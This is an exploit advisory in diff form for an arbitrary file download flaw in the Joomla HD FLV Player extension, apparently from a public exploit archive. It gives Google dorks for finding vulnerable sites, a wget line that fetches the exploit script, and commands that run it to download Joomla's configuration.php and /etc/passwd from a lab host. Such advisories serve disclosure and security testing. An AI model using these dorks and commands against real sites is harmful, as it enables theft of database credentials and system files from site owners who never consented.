@@ -1,0 +1,72 @@
+######################
+
+# Exploit Title :  Joomla HD FLV Player <= 2.1.0.1 Arbitrary File Download Vulnerability
+
+# Exploit Author : Claudio Viviani
+
+# Vendor Homepage : http://www.hdflvplayer.net/
+
+# Software Link : http://www.hdflvplayer.net/hd-flv-player-download.php
+
+# Dork google 1:  inurl:/component/hdflvplayer/
+# Dork google 2:  inurl:com_hdflvplayer    
+
+# Date : 2014-11-11
+
+# Tested on : BackBox 3.x/4.x
+
+####################################################################
+#
+# This video is intended for educational 
+# purposes only and the author can not be held liable for 
+# any kind of damages done whatsoever to your machine, 
+# or damages caused by some other,creative application of this video.
+# In any case you disagree with the above statement,stop here.
+#
+#####################################################################
+
+
+Server Web+Basedir: http://10.0.0.67/joomla
+
+
+1) Download Extension v.2.1.0.1 :
+
+http://www.hdflvplayer.net/
+
+
+2) Connect to Joomla and install the extension
+
+http://10.0.0.67/joomla/administrator/
+
+
+3) Check the installation:
+
+http://10.0.0.67/joomla/index.php?option=com_hdflvplayer
+
+
+4) Download Exploit: 
+
+wget http://www.homelab.it/wp-content/uploads/2014/11/j00m_hd_flv_afd.py_.txt
+
+
+5) Run Exploit and download joomla's configuration file:
+
+python j00m_hd_flv_afd.py -t http://10.0.0.67/joomla -f configuration.php
+
+
+5) Run Exploit and read linux passwd file:
+
+python j00m_hd_flv_afd.py -t http://10.0.0.67/joomla -f /etc/passwd
+
+
+# Exploit written by:
+
+#                    Claudio Viviani
+
+#                    http://www.homelab.it
+#                    info@homelab.it
+
+#                    https://www.facebook.com/homelabit
+#                    https://twitter.com/homelabit
+#                    https://plus.google.com/+HomelabIt1/
+#                    https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
